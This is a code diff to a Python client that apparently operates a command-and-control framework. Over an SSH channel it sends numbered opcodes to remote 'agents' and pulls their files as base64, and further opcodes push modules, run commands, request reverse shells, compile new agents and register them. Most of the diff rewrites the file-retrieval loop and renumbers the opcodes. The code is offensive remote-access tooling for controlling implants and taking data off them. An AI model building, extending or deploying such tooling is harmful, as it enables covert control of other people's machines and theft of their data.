@@ -1,5 +1,6 @@
 import paramiko
 import misc
+import base64 as b64
 
 class AgentStruct():
     def __init__(self, id, ip, connection_time, hostname, interfaces, process_owner):
@@ -59,68 +60,83 @@ class Session():
         filepath = "."#misc.getSavePath()
         cnt=0
         data = b""
+        ret = b""
+        ret_dat = b""
+        tmpbf = b""
 
         if not filepath:
             return 1
 
-        self.channel.sendall("21|"+agent_id)
+        self.channel.sendall("22|"+agent_id)
+        
         print("Sent request")
-        num = int(self.channel.recv(10).decode())
+        num = int(self.channel.recv(8192).decode())
+        
         print("Got number %d " % num)
+        print("Sending ready")
+        
+        self.channel.send("rd")    
         for i in range(num):
-            print("Sending ready")
-            self.channel.sendall("rd")
-            print("Getting name")
-            name = self.channel.recv(256).decode()
-            print("Got name " + name)
-            self.channel.sendall("ok")
-            print("sent ok")
-            size = int(self.channel.recv(10).decode())
-            print("Got size %d" % size)
-            self.channel.sendall("ok")
-            print("Sent OK")
-            if(size > 8196 * cnt):
-                print("inloop")
-                data += self.channel.recv(size)
-                print("Got data")
-                cnt +=1
-                print("inc")
-                self.channel.sendall("ok")
-                print("Sent ok")
+            cnt = 0
+            data = b''
             
-
+            name = self.channel.recv(256).strip(b'\x00')#.decode()
+            print(name)
+            name = name.decode()
+            if name == 'fi':
+                print("received last file successfully")
+                break
+            
+            self.channel.sendall("ok")
+            
+            size = int(self.channel.recv(8192).decode())
+            
+            self.channel.sendall("ok")
+            
+            dat = self.channel.recv(size)
             file = open(filepath + "/" + name, "wb")
-            file.write(data)
-
-        self.channel.sendall("cm")    
+            data = b64.decodebytes(dat)
+            file.write(data) 
+            file.close()
+            
+            ret = self.channel.recv(256).strip(b'\x00')
+            if ret != b'fi':
+                print("got next")
+                
+                self.channel.send('rd')
+                print(ret)
+            else:
+                print("[+] Got finished notification")
+                break  
+        print("Complete")     
 
     def upload_file(self, agent_id, file):
-        self.channel.sendall("22|" + file.filename)
+        self.channel.sendall("23|" + file.filename)
     
     def do_download(self, agent_id, path):
         print("[ ] Doing Download...")
-        self.channel.sendall("23|%s:%s" % (agent_id, path))
+        self.channel.sendall("24|%s:%s" % (agent_id, path))
 
     def push_module(self, agent_id, filestruct):
         print("[ ] Pushing module file to agent %s..." % agent_id)
-        self.channel.sendall("24|%s:%s" % (agent_id, filestruct.filename))
+        self.channel.sendall("25|%s:%s" % (agent_id, filestruct.filename))
 
     def send_command(self, agent_id, command):
         print("[ ] Sending command to agent...")
-        self.channel.sendall("25|%s:%s" % (agent_id, command))
+        self.channel.sendall("26|%s:%s" % (agent_id, command))
 
     def req_revsh(self, agent_id, port):
         print("[ ] Sending Reverse Shell Request...")
-        self.channel.sendall("26|%s:%s" % (agent_id, port))
+        self.channel.sendall("27|%s:%s" % (agent_id, port))
 
     def compile_agent(self, ip, port):
         print("[ ] Sending compile request to server (%s:%d)..." % (ip, port))
-        self.channel.sendall("27|%s:%s" % (ip, port))
+        self.channel.sendall("28|%s:%s" % (ip, port))
         fileData = ""
         misc.save_file(fileData)
 
     def register_agent(self, name, password):
         print("[ ] Registering agent with server...")
-        self.channel.sendall('28|%s:%s' % (name, password))
+        self.channel.sendall('29|%s:%s' % (name, password))
 
     
